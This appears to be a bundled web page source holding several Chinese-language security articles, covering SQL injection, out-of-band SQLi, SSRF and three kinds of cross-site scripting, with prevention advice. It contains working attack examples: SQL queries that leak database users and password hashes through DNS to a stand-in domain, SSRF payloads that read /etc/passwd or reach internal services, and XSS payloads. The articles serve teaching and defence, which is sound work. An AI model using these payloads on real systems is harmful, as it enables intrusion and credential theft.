如果MySQL数据库服务器的 \`secure_file_priv\` 全局系统变量没有值时，MySQL服务器 5.5.52 及以下版本（以及 MariaDB 分支）的默认情况，攻击者可以窃取数据，然后使用 \`load_file\` 函数创建对域名的请求，将泄露的数据放入请求中。

| secure_file_priv值  |  效果      |
|--------------------|---------|
| NULL | 表示限制mysql不允许导入或导出 |
| /tmp|表示限制mysql只能在/tmp目录中执行导入导出，其他目录不能执行|
|没有值时|表示不限制mysql在任意目录的导入导出|

<br>

假设恶意攻击者能够在目标数据库中执行以下 SQL 查询：

<font color="#00dddd">SELECT</font> load_file(<font color="#00dddd">CONCAT</font>('\\\\\\\\\\\\\\\\',(<font color="#00dddd">SELECT</font>+@@version),'.',(<font color="#00dddd">SELECT</font>+user),'.', (<font color="#00dddd">SELECT</font>+password),'.',example.com\\\\\\\\test.txt'))

<br>

这将导致应用程序向域 \`database_version.database_user.database_password.example.com\` 发送 DNS 请求，将敏感数据（数据库版本、用户名和用户密码）暴露给攻击者。

<br>

#### In PostgreSQL

如果应用程序使用的是 \`PostgreSQL\` 数据库，则以下 SQL 查询可获得与上述相同的结果：

<font color="#00dddd">DROP TABLE IF EXISTS</font> table_output;<br>
<font color="#00dddd">CREATE TABLE</font> table_output(content text);<br>
<font color="#00dddd">CREATE</font> OR <font color="#00dddd">REPLACE FUNCTION</font> temp_function()<font color="#00dddd">RETURNS VOID AS</font> $$ <font color="#00dddd">DECLARES</font> exec_cmd <font color="#00dddd">TEXT</font>;<br>
<font color="#00dddd">DECLARE</font> query_result_version <font color="#00dddd">TEXT</font>;<br>
<font color="#00dddd">DECLARE</font> query_result_user <font color="#00dddd">TEXT</font>;<br>
<font color="#00dddd">DECLARE</font> query_result_password <font color="#00dddd">TEXT</font>;<br>
<font color="#00dddd">BEGIN</font><br>
&nbsp;&nbsp;<font color="#00dddd">SELECT INTO</font> query_result_version (<font color="#00dddd">SELECT</font> current_setting('server_version'));<br>
&nbsp;&nbsp;<font color="#00dddd">SELECT INTO</font> query_result_user (<font color="#00dddd">SELECT</font> usename <font color="#00dddd">FROM</font> pg_shadow);<br>
&nbsp;&nbsp;<font color="#00dddd">SELECT INTO</font> query_result_password (<font color="#00dddd">SELECT</font> passwd <font color="#00dddd">FROM</font> pg_shadow);<br>
&nbsp;&nbsp;exec_cmd := E<font color="#00dd00">'COPY table_output(content)<br>
&nbsp;&nbsp;&nbsp;&nbsp;FROM E\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'</font>||query_result_version||'.'||query_result_user||'.'||query_result_password||E'.example.com\\\\\\\\\\\\\\\\test.txt\\\\'';<br>
&nbsp;&nbsp;<font color="#00dddd">EXECUTE</font> exec_cmd;<br>
<font color="#00dddd">END</font>;<br>
\\$\\$ <font color="#00dddd">LANGUAGE</font> plpgsql SECURITY <font color="#00dddd">DEFINER</font>;<br>
<font color="#00dddd">SELECT</font> temp_function();<br>

在这种情况下，罪魁祸首是 PostgreSQL 中的 \`COPY\` 函数，该函数旨在在文件和表之间移动数据。 在这里，它允许攻击者包含一个远程文件作为复制源。

<br>

#### In Oracle

如果应用程序使用的是 Oracle 数据库，则以下 SQL 查询可获得与上述相同的结果：

<font color="#00dddd">SELECT</font> DBMS_LDAP.INIT(<br>

&nbsp;&nbsp;&nbsp;(<font color="#00dddd">SELECT</font> version FROM v$instance)||<font color="#00dddd">'.'</font>||<br>

&nbsp;&nbsp;&nbsp;(<font color="#00dddd">SELECT user FROM</font> dual)||<font color="#00dddd">'.'</font>||<br>

&nbsp;&nbsp;&nbsp;(<font color="#00dddd">SELECT</font> name FROM v$<font color="#00dddd">database</font>)||<font color="#00dddd">'.'</font>||example.com' ,<font color="#c92c2c">80</font>) <font color="#00dddd">FROM</font> dual;<br>

在这种情况下，由于 DBMS_LDAP PL/SQL 包中的 init() 函数，带外SQL注入（OOB SQLi）成为可能。但是，这并不是唯一可用于向远程端点发出请求的 \`Oracle\` 包。 例如，您还可以使用 \`UTL_HTTP\` 包中的 \`REQUEST\` 函数。

#### In MS SQL

如果应用程序使用的是 \`MS SQL\` 数据库，则以下 SQL 查询会获得与上述相同的结果（但没有密码）：

<font color="#00dddd">DECLARE</font> @a <font color="#00dddd">varchar</font>(1024);<br>
<font color="#00dddd">DECLARE</font> @b <font color="#00dddd">varchar</font>(1024);<br>
<font color="#00dddd">SELECT</font> @a = (<font color="#00dddd">SELECT system_user</font>);<br>
<font color="#00dddd">SELECT</font> @b = (<font color="#00dddd">SELECT</font> DB_Name()); <br>
<font color="#00dddd">EXEC</font>(<font color="#00dd00">'master..xp_dirtree"\\\\\\\\'</font>+@a+<font color="#00dd00">''</font>+<font color="#00dd00">'.'</font>+<font color="#00dd00">''</font>+@b+<font color="#00dd00">'example.com\\test$"'</font>);<br>

由于 xp_dirtree 存储过程，带外SQL注入（OOB SQLi）成为可能。 虽然最初用于列出本地目录树，但它可以被诱骗导致 DNS 查找。
`,jb=`---
title: SQL注入
date: 2026-05-06
summary: * SQL 注入 （SQLi） 是一种漏洞，它允许恶意黑客将不需要的 SQL 代码引入（注入）到软件执行的 SQL 查询中。
tags: 漏洞库, Web安全, SQL注入
cover: app-blue
readingTime: 6 分钟
featured: false
---
# SQL注入

### 什么SQL注入？

<br>

* SQL 注入 （SQLi） 是一种漏洞，它允许恶意黑客将不需要的 SQL 代码引入（注入）到软件执行的 SQL 查询中。

<br>

### SQL注入是如何工作的？

<br>

如果我们的WEB应用程序使用外部数据库，它需要创建对该数据的查询并检索结果。大多数应用程序使用支持SQL（结构化查询语句）的关系数据库，这是一种旨在简单易懂的文本语言。比较流行的SQL数据库包括Oracle、Microsoft SQL Server (MSSQL)、 MySQL、 PostgreSQL等。

<br>

对数据库的查询很少是静态的--应用程序需要从数据库中获取或存储的信息通常取决于用户提供的数据。用户输入通常采用简单文本的形式，就像SQL语法本身一样，因此开发人员通常通过将用户提供的数据与SQL语句直接拼接来创建查询。例如，根据用户提供的ID返回用户的姓名。\`SELECT user_name FROM users WHERE user_id = 'id_supplied_by_the_user'\`

<br>

如果没有输入验证，恶意攻击者可能会在网页输入表单提交或者直接发送HTTP请求来提供SQL语句的负载。如果应用程序简单地将此类用户数据与静态命令拼接起来，攻击者通常能够完全改变语法和原始查询。攻击者可能使用特殊字符（如单引号、分号）来添加命令和/或忽略静态命令。由此产生的恶意代码甚至可能允许攻击者执行DROP（删除数据库表甚至整个数据库）等命令。这种攻击行为称为SQL注入。

<br>

SQL注入可能发生在任何与SQL数据库交互的软件中，而在Web应用程序中最容易出现安全问题，因为Web应用程序经常使用后端SQL服务器。当然，SQL注入也可能出现在其他类型的应用程序和系统中。

<br>

SQL注入被认为是最古老的已知漏洞之一--它们于1998年首次被记录。SQL注入被归类为[CWE-89: Improper neutralization of special elements used in an SQL command](https://cwe.mitre.org/data/definitions/89.html)（即SQL命令中使用的特殊元素的不正确中和），并且包含在[OWASP Top 10 A3:2021 category](https://owasp.org/Top10/A03_2021-Injection/)(即注入)。

<br>

### 一个SQL注入的简单例子

让我们看看攻击者可以使用下面简单的身份验证示例做什么:

<font color="#00dddd">SELECT</font> * <font color="00dddd">FROM</font> users <font color="#00dddd"> WHERE</font>  user_id = <font color="#00dd00">'id_supplied_by_the_user'</font> <font color="#00dddd">AND</font> password = <font color="#00dd00">'password_supplied_by_the_user'</font>

<br>

如果数据库中有匹配的 \`ID\` 和 \`密码\` 记录，这个简单的 SELECT 语句将返回所有相关的用户数据。 这意味着如果用户提供了有效的 \`ID\` 和 \`密码\`，查询可能会返回用户的姓名和年龄（取决于用户表的架构）。 如果用户提供了无效的 \`ID\` 和/或 \`密码\` ，查询将返回一个空数据集。 开发人员可能会使用这个简单的查询来检查用户是否可以登录。

<br>

恶意攻击者可能会提供以下 \`id_supplied_by_the_user\` 值：

admin'--

<br>

结果，发送到数据库的查询字符串将变为：

<font color="#00dddd">SELECT</font> * <font color="00dddd">FROM</font> users <font color="#00dddd"> WHERE</font>  user_id =  <font color="#00dd00">'admin'</font><font color="#6b7782">--' AND password = ''</font>

<br>

单引号完成了 \`user_id\` 的配对，双破折号 (\`--\`) 导致 SQL 语句的其余部分（即密码检查）被视为注释。 因此，应用程序执行以下查询：

<font color="#00dddd">SELECT</font> * <font color="00dddd">FROM</font> users <font color="#00dddd"> WHERE</font>  user_id =  <font color="#00dd00">'admin'</font>

<br>

如果执行，此查询就会造成成功的 SQL 注入。 它返回管理员的所有用户数据，可能允许恶意攻击者以管理员身份获得对应用程序的未授权访问。

<br>

### SQL注入漏洞的类型

目前主要有以下几种 SQL 注入技术：

* [带内（In-band）SQLi（基于错误和基于联合选择）](./SQLiType/In-band-SQLi.md)
* [推理/盲 SQLi（基于布尔值和基于时间）](./SQLiType/Blind-SQLi.md)
* [带外 SQLi](./SQLiType/Out-of-band-SQLi.md)

<br>

### SQL 注入攻击的潜在后果

SQL 注入是最严重的漏洞之一，原因有二。 

首先，Web 应用程序访问的数据库通常包含对攻击者具有最高价值的高度敏感信息。 因此，攻击者对获取这些数据非常感兴趣。

其次，结合其他常见漏洞利用 SQL 注入可能会产生严重后果。 甚至可以通过 SQL 注入获取操作系统访问权限，从而为完全接管系统开辟道路。

SQL 注入的典型后果包括：

* 访问存储在数据库中的敏感数据，例如密码和/或信用卡号
* 访问有关数据库和操作系统的信息以帮助进一步攻击
* 如果攻击者能够使用权限提升（privilege elevation）获得操作系统访问权限，然后获得 root 访问权限

<br>

### 如何防止 Web 应用程序中的 SQL 注入漏洞

在 Web 应用程序中防止 SQLi 漏洞的唯一完全有效的方法是使用参数化查询（也称为准备语句）访问 SQL 数据库。 几乎所有常见的编程语言都提供参数化查询。 它们让您避免字符串连接，将参数安全地传递给 SQL 查询。如果您的编程语言不支持参数化查询，但您的数据库引擎支持存储过程，则您可以使用带有准备好的语句的存储过程。

不建议纯粹依赖其他预防方法，例如白名单、黑名单或输入过滤/转义。 恶意攻击可能会找到绕过这种检查的方法。 随着参数化查询在编程语言和应用程序框架中的广泛应用，没有理由再使用自定义方法。 仅当参数化查询和存储过程不可用时，此类方法才可能是后备方法。

此外，您应该将您的环境配置为不显示数据库错误——这有助于缓解甚至未发现的基于错误的 SQL 注入漏洞。`,Qb=`---
title: 服务器端请求伪造 (SSRF)
date: 2026-05-02
summary: 服务器端请求伪造 (SSRF) 是一种漏洞，可让恶意攻击者从软件后端向另一台服务器或本地服务发送请求。 接收该请求的服务器或服务认为该请求来自可信应用程序并且是合法的。
tags: 漏洞库, Web安全, SSRF
cover: app-yellow
readingTime: 6 分钟
featured: false
---
# 服务器端请求伪造 (SSRF)

### 什么是服务器端请求伪造 (SSRF)

服务器端请求伪造 (SSRF) 是一种漏洞，可让恶意攻击者从软件后端向另一台服务器或本地服务发送请求。 接收该请求的服务器或服务认为该请求来自可信应用程序并且是合法的。

<br>

### 服务器端请求伪造是如何进行的

当您构建网络软件时，您经常需要向其他服务器发出请求。 开发人员通常使用它们来获取远程资源，例如软件更新，或者从另一个应用程序导入元数据。 这样的请求一般来说并不危险，但如果实施不当，它们会使软件容易受到服务器端请求伪造的攻击。

当您使用用户输入数据创建请求时（例如，在构建 URL 时），可能会引入 SSRF 漏洞。 为执行 SSRF 攻击，攻击者随后可以更改易受攻击软件中的参数值，以创建或控制来自该软件并发送至其他服务器甚至同一台服务器的请求。

SSRF 漏洞可能出现在任何类型的计算机软件、几乎所有编程语言和任何平台上，只要该软件在网络环境中运行即可。 大多数 SSRF 漏洞发生在 Web 应用程序和其他网络应用程序中，但它们也可能出现在服务器软件本身中。

除了常规（非盲）SSRF 漏洞外，还有其他类型的 SSRF。 其中包括盲 SSRF 漏洞，攻击者不会直接从受攻击资源接收任何数据，但攻击者可以使用盲 SSRF 来触发他们只能从内部网络中触发的操作。

![](../src/ssrf.png)

<br>

### Web 应用程序 SSRF 攻击示例

Web 应用程序中最常见的 SSRF 示例是攻击者可以输入或影响 Web 应用程序向第三方服务发出的请求 URL。

易受攻击的代码：
以下代码用于输出从另一个 URL 加载的 PNG 图像：

<font color="#e90">\\<?php</font>
  <font color="#00dddd">if</font> (<font color="#00dddd">isset</font>(<font color="#a67f59">\\$_GET</font>[<font color="#00dd00">'url'</font>])) {
    <font color="#a67f59">\\$url = \\$_GET</font>[<font color="#00dd00">'url'</font>];
    <font color="#a67f59">\\$image</font> = <font color="#00dd00">fopen</font>(<font color="#a67f59">\\$url</font>, <font color="#00dd00">'rb'</font>);
    <font color="#00dd00">header</font>(<font color="#00dd00">"Content-Type: image/png"</font>);
    <font color="#00dd00">fpassthru</font>(<font color="#a67f59">\\$image</font>);
  }
<font color="#e90">?\\></font><br>

请注意，攻击者可以完全控制 url 参数。 他们可以向任何外部 IP 发出任意 GET 请求，包括本地网络上的 IP，以及托管易受攻击应用程序 (localhost) 的服务器上的资源。

攻击向量
使用易受攻击的应用程序，攻击者可以向启用了 mod_status（这是默认配置）的 Apache Web 服务器发出以下请求：

    GET /?url=http://localhost/server-status HTTP/1.1

结果，攻击者收到有关服务器版本、已安装模块等的详细信息。 这有助于攻击者搜索更多潜在的漏洞。

<br>

除了 http 和 https URL 架构外，攻击者还可能在其有效payload中使用旧的 URL 架构（例如文件架构）来尝试访问本地系统或内部网络上的文件。

    GET /?url=file:///etc/passwd HTTP/1.1

此payload将为攻击者提供来自托管易受攻击应用程序的服务器上的 \`/etc/passwd\` 文件内容。

<br>

某些应用程序可能允许攻击者使用奇异的 URL 模式。 例如，如果应用程序使用 cURL 发出请求，攻击者可以使用 dict URL 架构向任何端口上的任何主机发出请求并发送自定义数据。

    GET /?url=dict://localhost:11211/stat HTTP/1.1

上述请求将导致应用链接到主机的11211端口并且发送字符串"stat"。 端口 11211 是 [Memcached](https://memcached.org/) 使用的默认端口（这个端口通常不会暴露给外部网络）。 但可以从本地主机访问，在本例中是通过 SSRF。

<br>

### SSRF 攻击的潜在后果

攻击者在尝试服务器端请求伪造攻击时，有两个主要目标：

- 访问特权资源：恶意黑客通常使用 SSRF 攻击以私有 IP 地址或位于防火墙后面的内部资源为目标，或者通过被利用服务器的环回接口 (http://127.0.0.1) 访问可用的服务。 例如，这可能包括 Azure/AWS 云服务元数据 (http://169.254.169.254)、内部 API，在某些情况下甚至是易受攻击服务器上的特权文件。 攻击者甚至可能使用 SSRF 进行本地端口扫描。

<br>

- 隐藏连接的真实来源：例如，攻击者可能会使用 SSRF，即使他们可以直接访问资源，只是为了掩盖他们的踪迹。 这样，访问尝试似乎源自易受 SSRF 攻击的本地应用程序的后端，而不是直接来自攻击者，这使得溯源更加麻烦。 攻击者还可能使用您易受攻击的服务器攻击其他人，从而使您的系统看起来像是实际攻击的源头。

<br>

由于这些原因，SSRF 利用通常是利用另一个漏洞之前的初步攻击步骤。 例如：

攻击者可能首先执行 SSRF 来访问位于另一台服务器上的关键业务应用程序，该应用程序只能从内部网络访问，然后使用 SQLi 来访问该业务应用程序背后的数据库。
攻击者还可能使用 SSRF 访问安装在托管具有远程代码执行 (RCE) 漏洞的应用程序的服务器上的本地应用程序，然后使用该应用程序获得完整的 shell 访问权限，然后利用操作系统漏洞获取 root 访问服务器。
因此，在最坏的情况下，如果 SSRF 与其他攻击向量（如 RCE、XXE、XSS、CSRF 或 SQLi）结合使用，则可能允许攻击者完全控制易受攻击的服务器或访问高度敏感的数据。

<br>

### 防止 SSRF 需要综合方法


以下组合方法将帮助您避免大多数 SSRF 漏洞，但您必须意识到它们并不完美，即使组合使用也是如此。 这就是为什么即使采用最佳安全编码实践也需要进行安全测试的原因。

白名单：您应该将您的应用程序需要访问的主机名（DNS 名称）或 IP 地址列入白名单。 然而，这种方法本身并不能阻止攻击者，例如，在白名单服务器上运行端口扫描或访问该服务器上的其他资源。

响应处理：如果您的应用程序显示或处理从其他服务器收到的数据，您必须确保收到的响应采用预期的格式。 您永远不应该将原始响应正文发送给客户端。 但是，这并不能防止盲目的 SSRF 攻击。

架构控制：如果您的应用程序仅使用 HTTP 或 HTTPS 发出请求，则仅允许这些 URL 架构。 如果禁用所有其他 URL 模式，攻击者将无法使用 Web 应用程序使用具有潜在危险的模式（例如文件、字典、ftp 和 gopher）发出请求。`,Yb=`---
title: 盲跨站脚本
date: 2026-04-30
summary: 盲跨站点脚本是存储/持久跨站点脚本的一种子类型，其中 Web 应用程序存储攻击者发送的有效负载并仅在稍后执行（在不同时间或在不同地点，甚至可能在另一个 Web 中）。
tags: 漏洞库, Web安全, XSS
cover: app-blue
readingTime: 6 分钟
featured: false
---
# 盲跨站脚本

### 什么是盲跨站脚本

盲跨站点脚本是存储/持久跨站点脚本的一种子类型，其中 Web 应用程序存储攻击者发送的有效负载并仅在稍后执行（在不同时间或在不同地点，甚至可能在另一个 Web 中）。

### 盲跨站脚本示例

在此示例中，开发人员允许用户通过选择任意用户名在 Web 应用程序中注册。 应用程序的register.php页面包含以下表单：

\`\`\`
<form action="/registered.php" method="post" id="comment">
  <label for="username">Choose a username:</label>
  <input type="text" id="username" name="username">
  <label for "password">Choose a password:</label>
  <input type="password" id="password" name="password">
  <button type="submit" form="register" value="register">Register</button>
</form>
\`\`\`

registered.php 文件包含以下代码：

\`\`\`
// 使用 PDO 将新用户添加到数据库以避免 SQL 注入
(...)
$username=$_POST["username"];
$password=password_hash($_POST["password"], PASSWORD_DEFAULT);
$sql = "INSERT INTO users (username, password) VALUES (?,?)";
$statement = $pdo->prepare($sql);
$statement->execute([$username, $password]);
(...)
\`\`\`
正如您所看到的，应用程序将用户名插入数据库而不进行任何验证或清理。

与此同时，另一位开发人员创建了一个不同的应用程序，允许经过身份验证的管理员显示 50 个最新用户的列表。 newusers.php 页面将它们显示在表格中：

\`\`\`
(...)
$sql = "SELECT * FROM users ORDER BY id DESC LIMIT 50";
$statement = $pdo->query($sql);
while ($row = $statement->fetch()) {
    echo "<tr><td>".$row['id']."</td><td>".$row['username']."</td></tr>";
}
(...)
\`\`\`
正如您所看到的，此应用程序假设数据库中的数据是安全的，并且在显示数据之前不会执行任何验证或清理。

#### 盲跨站脚本攻击

击者在表单中输入以下用户名：

    <script>alert("YOUR ADMINISTRATIVE INTERFACE IS HACKED!");<\/script>

攻击者单击“注册”按钮后，此攻击负载将作为新用户名保存在数据库中。

一周后，管理员打开管理应用程序并调用列出通过公共应用程序注册的最新 50 个用户的函数（newusers.php 页面）。 如果恶意用户也在其中，浏览器遇到恶意用户名时会接收并解释以下代码：

    <td><script>alert("YOUR ADMINISTRATIVE INTERFACE IS HACKED!");<\/script></td>

浏览器找到一个 \\<script> 标签并执行其中的 JavaScript 代码。 结果，它会向管理员显示一个弹出窗口。

#### 修复

得知该漏洞后，开发人员决定使用 HTMLPurifier 过滤来保护代码，并转义 HTML 字符。 他们导入 HTMLPurifier 库并按以下方式修改 Registered.php 文件：

\`\`\`
// 使用 PDO 将新用户添加到数据库以避免 SQL 注入
// HTMLPurifier 进行 HTML 转义以避免 XSS
(...)
$username=$_POST["username"];
$password=password_hash($_POST["password"], PASSWORD_DEFAULT);
// Purify user data using HTMLPurifier
(...)
$purifier = new HTMLPurifier($config);
$purified_username = $purifier->purify($username);
// Just to be sure, HTML-escape special characters
$safe_username = htmlspecialchars($purified_username, ENT_QUOTES);
// Save safe data in the database
$sql = "INSERT INTO users (username, password) VALUES (?,?)";
$statement = $pdo->prepare($sql);
$statement->execute([$safe_username, $password]);
(...)
\`\`\`

### 盲跨站脚本攻击的后果

盲跨站脚本与存储型 XSS 的其他变体一样危险，甚至更危险，因为它的影响不是立竿见影的，而且检测起来也更加困难。

以下是黑帽黑客只能根据前面介绍的简单示例执行的一些操作：

* 他们可以将管理员重定向到模仿原始应用程序的恶意页面并要求他们登录，从而窃取他们的凭据。
他们可以窃取管理员的会话 cookie 来冒充特权用户。

* 他们可能会诱骗管理员在其计算机上下载并安装恶意软件，例如木马、加密货币挖掘程序或勒索软件。

任何这些攻击都可能让攻击者升级并可能获得对组织中其他计算机系统的访问权限。
`,Xb=`---
title: 基于 DOM 的跨站脚本
date: 2026-04-29
summary: 基于 DOM 的跨站点脚本是一种跨站点脚本 (XSS)，这种攻击利用了文档对象模型 (DOM)。
tags: 漏洞库, Web安全, XSS
cover: app-yellow
readingTime: 6 分钟
featured: false
---
# 基于 DOM 的跨站脚本

### 什么是基于 DOM 的跨站脚本
基于 DOM 的跨站点脚本是一种跨站点脚本 (XSS)，这种攻击利用了文档对象模型 (DOM)。

<br>

### 基于 DOM 的跨站点脚本是如何工作的
DOM 是一种内部数据结构，用于存储网页的所有对象和属性。 例如，HTML 代码中使用的每个标记都表示一个 DOM 对象。 此外，网页的 DOM 包含有关页面 URL 和元信息等属性的信息。 开发人员可以使用 JavaScript 引用这些对象和属性并动态更改它们。

文档对象模型使动态的单页应用程序成为可能。 然而，它也是使基于 DOM 的跨站点脚本成为可能的原因。

与所有其他类型的跨站点脚本不同，基于 DOM 的 XSS 纯粹是客户端漏洞。 这意味着在基于 DOM 的 XSS 攻击期间，有效负载永远不会到达服务器。 整个攻击发生在网络浏览器中。

基于 DOM 的 XSS 与反射型 XSS 类似，因为在攻击过程中不存储任何信息。 基于 DOM 的 XSS 攻击也是通过诱骗受害者点击恶意 URL 来进行的。

### 基于DOM的跨站脚本中的源和接收器
每个基于 DOM 的 XSS 漏洞都有两个元素：用户输入的源和写入用户输入的目标（称为接收器）。攻击者可以操纵的流行源包括 <font color="red">document.URL</font>、<font color="red">document.documentURI</font>、<font color="red">location.href</font>、<font color="red">location.search</font>、<font color="red">location.*</font>、<font color="red">window.name</font>和 <font color="red">document.referrer</font>。 流行的接收器有 <font color="red">document.write</font>、<font color="red">(element).innerHTML</font>、<font color="red">eval</font>、<font color="red">setTimeout</font>、<font color="red">setInterval</font> 和 <font color="red">execScript</font>。 请注意，此列表并不详尽，还存在许多其他源和接收器。

为了使 JavaScript 代码容易受到基于 DOM 的 XSS 攻击，它必须从攻击者可以控制的源获取信息，然后将此信息传递到接收器。

### 基于DOM的跨站脚本示例

在此示例中，开发人员希望在仪表板页面 (dashboard.html) 上显示用户的名称。 用户名作为 URL 中的参数传递给应用程序：

\`\`\`
<html>
(...)
Dashboard for
<script>
   var pos=document.URL.indexOf("context=")+8;
   document.write(decodeURIComponent(document.URL.substring(pos)));
<\/script>
(...)
</html>
\`\`\`

内镶脚本在 URL 中查找 context= (document.URL.indexOf("context="))，获取其右侧的所有文本（+8 表示 context= 开头右侧的 8 个字符）， 并使用 document.write 将该文本直接插入到 HTML 中以供浏览器显示。

如果您访问以下网址：

    http://www.example.com/dashboard.html?context=Thomas

该页面会显示：

    Dashboard for Thomas

### 基于DOM的跨站脚本攻击

攻击者创建以下 URL：

    http://www.example.com/dashboard.html?context=
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%4c%45
%41%56%45%20%54%48%49%53%20%50%41%47%45%21%20%59%4f
%55%20%41%52%45%20%42%45%49%4e%47%20%48%41%43%4b%45
%44%21%22%29%3b%3c%2f%73%63%72%69%70%74%3e

此有效负载中的长十六进制代码字符串是以下内容的 URL 编码形式：

    <script>alert("LEAVE THIS PAGE! YOU ARE BEING HACKED!");<\/script>

然后，攻击者将 URL 发送给受害者，例如通过电子邮件或即时消息。 受害者单击该 URL，导致其浏览器打开dashboard.html页面并运行恶意脚本。 这将重写文档内容并将以下标记插入到浏览器解释的 HTML 中：

    Dashboard for <script>alert("LEAVE THIS PAGE! YOU ARE BEING HACKED!");<\/script>

结果，浏览器会显示一个弹出窗口，敦促用户离开页面。 其后果是目标用户将停止访问该网络应用程序，因为担心自己的信息安全。

### 修复

得知该漏洞后，开发人员使用安全接收器重写了代码。 因此，来自源的不受信任的内容将始终被解释为文本，而不是代码：

\`\`\`
<html>
(...)
Dashboard for <span id="contentholder"></span>
<script>
   var pos=document.URL.indexOf("context=")+8;
   document.getElementById("contentholder").textContent = 
       document.URL.substring(pos,document.URL.length);
<\/script>
(...)
</html>
\`\`\`

开发人员创建一个占位符对象，并将用户名不直接写入 HTML，而是写入占位符对象的 textContent 属性（使用安全接收器）。 这保证了浏览器不会将此内容解释为代码，而只会将其显示为文本。

### 基于 DOM 的跨站脚本攻击的后果

基于 DOM 的跨站点脚本漏洞并不常见，但成功攻击的后果可能与其他反射型 XSS 攻击一样可怕。 以下是黑帽黑客可以根据前面介绍的简单示例执行的一些操作：

* 他们可以创建网络钓鱼活动，并发送数百万封包含恶意链接的电子邮件，其有效负载会将用户重定向到旨在模仿您的 Web 应用程序的网络钓鱼页面。 因此，数百万用户的凭据可能会被盗，并归咎于您的 Web 应用程序，这将严重损害您的声誉。

* 他们可以创建一个有效负载，将用户发送到模仿您应用程序登录页面的恶意页面。 然后，他们可以将此恶意 URL 发送给您的内部用户，甚至是您的CEO。如果您的一名用户上当，攻击者就会获取他们的凭据来升级攻击。 最终，这可能会让恶意行为者获得对组织中其他计算机系统的访问权限。

### 如何防止基于 DOM 的跨站脚本漏洞

完全避免 JavaScript 代码中基于 DOM 的 XSS 漏洞的最佳方法是使用正确的输出方法（安全接收器）。 例如，如果您想写入 \\<div> 元素，请不要使用innerHtml。 请使用innerText 或textContent。

请注意，并非所有 DOM 元素都有安全的输出方法。 在某些情况下，您必须避免使用不受信任的数据。 例如，您绝不能将任何不受信任的数据写入 eval 或 execScript 等接收器。`,Gb=`---
title: 反射/非持久性跨站点脚本
date: 2026-04-28
summary: 反射型跨站脚本是一种跨站脚本 (XSS)，攻击者不会将负载发送到 Web 应用程序； 相反，他们以包含有效负载（通常经过混淆）的 URL 形式将其发送给受害者。 受害者单击 URL 并打开易受攻击的 Web 应用程序，无意中执行了有效负载。
tags: 漏洞库, Web安全, XSS
cover: app-teal
readingTime: 6 分钟
featured: false
---
# 反射/非持久性跨站点脚本

### 什么是反射/非持久性跨站点脚本

反射型跨站脚本是一种跨站脚本 (XSS)，攻击者不会将负载发送到 Web 应用程序； 相反，他们以包含有效负载（通常经过混淆）的 URL 形式将其发送给受害者。 受害者单击 URL 并打开易受攻击的 Web 应用程序，无意中执行了有效负载。 反映的跨站点脚本也称为非持久性跨站点脚本。

### 反射/非持久性跨站点脚本示例
在此示例中，开发人员希望在欢迎屏幕 (welcome.php) 上显示当前经过身份验证的用户的名称。 它们包括 login.php 网页上的以下登录表单：

\\<<font color="red">form</font> <font color="#00dd00">action</font>="<font color="#00dddd">/welcome.php</font>" <font color="#00dd00">method</font>="<font color="#00dddd">get</font>" <font color="#00dd00">id</font>="<font color="#00dddd">login</font>"\\>
  \\<<font color="red">label</font>  <font color="#00dd00">for</font>="<font color="#00dddd">name</font>">Your name:\\</<font color="red">label</font>>
  \\<<font color="red">input</font> <font color="#00dd00">type</font>="<font color="#00dddd">text</font>" <font color="#00dd00">id</font>="<font color="#00dddd">name</font>" <font color="#00dd00">name</font>="<font color="#00dddd">name</font>">
  \\<<font color="red">label</font> <font color="#00dd00">for "password"</font>>Your password:\\</<font color="red">label</font>>
  \\<<font color="red">input</font> <font color="#00dd00">type</font>="<font color="#00dddd">password</font>" <font color="#00dd00">id</font>="<font color="#00dddd">password</font>" <font color="#00dd00">name</font>="<font color="#00dddd">password</font>"\\>
  \\<<font color="red">button</font> <font color="#00dd00">type</font>="<font color="#00dddd">submit</font>" <font color="#00dd00">form</font>="<font color="#00dddd">login</font>" <font color="#00dd00">value</font>="<font color="#00dddd">login</font>">Log in\\</<font color="red">button</font>>
\\</<font color="red">form</font>>

<br>

welcome.php 文件包含以下代码：

// Display the name of the user
(<font color="#a67f59">...</font>)
<font color="#a67f59">\\$name=\\$_GET</font>[<font color="#00dd00">"name"</font>];
<font color="#00dddd">echo</font> <font color="#00dd00">"\\<strong>Hello, "</font><font color="#a67f59">.\\$name.</font><font color="#00dd00">"!\\</strong>"</font>;
(<font color="#a67f59">...</font>)

如您所见，应用程序使用 GET 方法发送名称和密码，然后在没有任何验证或清理的情况下在 welcome.php 页面上显示名称。

#### 反射型跨站脚本攻击

攻击者创建以下 URL：
    \`http://www.example.com/welcome.php?name=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%4c%45%41%56%45%20%54%48%49%53%20%50%41%47%45%21%20%59%4f%55%20%41%52%45%20%42%45%49%4e%47%20%48%41%43%4b%45%44%21%22%29%3b%3c%2f%73%63%72%69%70%74%3e\`

此负载中的一长串十六进制代码是以下内容的 URL 编码形式：

\\<script><font color="#00dd00">alert</font>(<font color="#00dd00">"LEAVE THIS PAGE! YOU ARE BEING HACKED!"</font>);\\<\/script>

然后，攻击者将 URL 发送给受害者，例如，通过电子邮件或即时消息。 受害者单击该 URL，打开 welcome.php 页面，他们的浏览器会解释以下代码：

\\<<font color="red">strong</font>>Hello, \\<<font color="red">script</font>><font color="#00dd00">alert</font>(<font color="#00dd00">"LEAVE THIS PAGE! YOU ARE BEING HACKED!"</font>);\\</<font color="red">script</font>>!\\</<font color="red">strong</font>>

浏览器找到一个 \\<script> 标签并执行其中的 JavaScript 代码。 结果，它会显示一个弹出窗口，敦促用户离开该页面。 结果是目标用户担心自己的安全将停止访问 Web 应用程序。

### 修复

获悉此漏洞后，开发人员决定使用 HTMLPurifier 过滤来保护代码并转义 HTML 字符。 他们导入 HTMLPurifier 库并按以下方式修改 welcome.php 文件：

// Display the name of the user
// Use HTMLPurifier with HTML escaping to avoid XSS
<font color="#a67f59">\\$name=\\$_GET</font>[<font color="#00dd00">"name"</font>];
// Purify user data using HTMLPurifier
(<font color="#a67f59">...</font>)
<font color="#a67f59">\\$purifier</font> = <font color="#00dddd">new HTMLPurifier</font>(<font color="#a67f59">\\$config</font>);
<font color="#a67f59">\\$purified_name</font> = <font color="#a67f59">\\$purifier-></font><font color="#00dd00">purify</font>(<font color="#a67f59">\\$name</font>);
// Just to be sure, HTML-escape special characters
